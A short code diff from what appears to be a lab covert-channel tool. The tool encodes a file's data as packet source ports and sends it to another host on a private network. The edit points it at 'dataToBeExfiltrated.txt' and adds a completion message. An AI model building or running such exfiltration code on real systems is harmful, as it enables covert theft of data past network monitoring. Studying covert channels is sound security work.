@@ -58,7 +58,7 @@ def sendpacket(source_IP, dst_IP, src_port, dst_port=5433):
 
 def main():
     #creates the list of source ports to send
-    list_of_decimal = fileToDecimal('testFile.txt')
+    list_of_decimal = fileToDecimal('dataToBeExfiltrated.txt')
     sourceIP = "192.168.30.128"
     destinationIP = "192.168.30.129"
     #seconds between 3 packets
@@ -83,6 +83,8 @@ def main():
 
     #Last packet sent with port 32768 to signal the end of the data transfer
     sendpacket(sourceIP, destinationIP, 32768)
+
+    print("All packets have been sent.")
 
 
 if __name__ == "__main__":
